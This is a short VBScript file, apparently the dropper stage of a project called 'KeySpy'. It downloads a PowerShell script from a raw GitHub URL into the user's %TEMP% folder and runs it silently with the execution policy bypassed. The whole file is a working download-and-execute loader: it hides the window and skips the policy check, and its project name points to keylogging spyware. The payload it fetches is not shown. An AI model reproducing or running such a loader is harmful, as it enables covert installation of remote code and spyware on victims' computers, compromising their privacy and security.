' Create a WScript.Shell object
Set objShell = CreateObject("WScript.Shell")

' Define the URL of the execute.ps1 file
ps1Url = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/execute.ps1"  ' Replace "https://example.com/execute.ps1" with the actual URL

' Define the destination folder for execute.ps1
destinationTemp = objShell.ExpandEnvironmentStrings("%TEMP%")

' Define the path to the execute.ps1 file in the temporary folder
ps1FilePath = destinationTemp & "\execute.ps1"

' Download the execute.ps1 file to the temporary folder
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.open "GET", ps1Url, False
objHTTP.send

If objHTTP.Status = 200 Then
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    ' Write the content to the execute.ps1 file
    Set objFile = objFSO.CreateTextFile(ps1FilePath, True)
    objFile.Write objHTTP.responseText
    objFile.Close
End If

' Run the execute.ps1 script silently
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File """ & ps1FilePath & """", 0, True
